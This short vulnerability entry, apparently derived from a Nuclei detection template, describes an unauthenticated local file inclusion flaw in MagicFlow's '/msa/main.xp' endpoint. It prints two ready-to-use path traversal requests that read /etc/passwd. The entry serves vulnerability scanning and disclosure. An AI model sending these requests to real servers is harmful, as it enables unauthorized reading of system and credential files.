# Vulnerability: MagicFlow - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`magicflow-lfi.yaml`)

## Description
MagicFlow is susceptible to local file inclusion vulnerabilities because it allows remote unauthenticated users to access locally stored files on the server and return their content via the '/msa/main.xp' endpoint and the 'Fun' parameter.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=msagroup.txt+downLoadFile=../../../../../../etc/passwd
GET {{BaseURL}}/msa/../../../../../../../../etc/passwd
```

